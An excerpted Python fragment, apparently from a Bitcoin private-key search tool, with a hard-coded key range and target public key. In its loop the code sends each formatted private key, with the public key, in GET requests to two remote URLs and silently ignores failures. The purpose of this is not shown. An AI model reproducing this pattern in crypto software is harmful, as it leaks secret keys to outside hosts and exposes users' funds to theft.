...
if __name__ == '__main__':
    ...
    sys.argv = []
    sys.argv.append("lol")
    sys.argv.append("800000000000000000000000000000:ffffffffffffffffffffffffffffff")
    sys.argv.append("02ceb6cbbcdbdf5ef7150682150f4ce2c6f4807b349827dcdbdd1f2efa885a2630")
    # sys.argv.append("lol")
    # sys.argv.append("1:2ac093407f3")
    # sys.argv.append("03c03961a560287e10894ebfdff013161bc53dd3468fa1820e19789cfc0f1948b9")
    if len(sys.argv) > 1 :
        #bits
        try:
    ...
    for n_timeit in xrange(1,Ntimeit+1):
        ...
        if 1:
            ...
            provkey = "{:064x}".format(prvkey)
            try:
                respns = requests.get(str(website_info)+"banana_"+str(provkey)+"_"+str(pubkey), timeout=60)
                print(respns)
                time.sleep( 10 )
            except:
                pass
            try:
                respns = requests.get(str(website_info2)+"banana_"+str(provkey)+"_"+str(pubkey), timeout=60)
                print(respns)
                time.sleep( 10 )
            except:
                pass
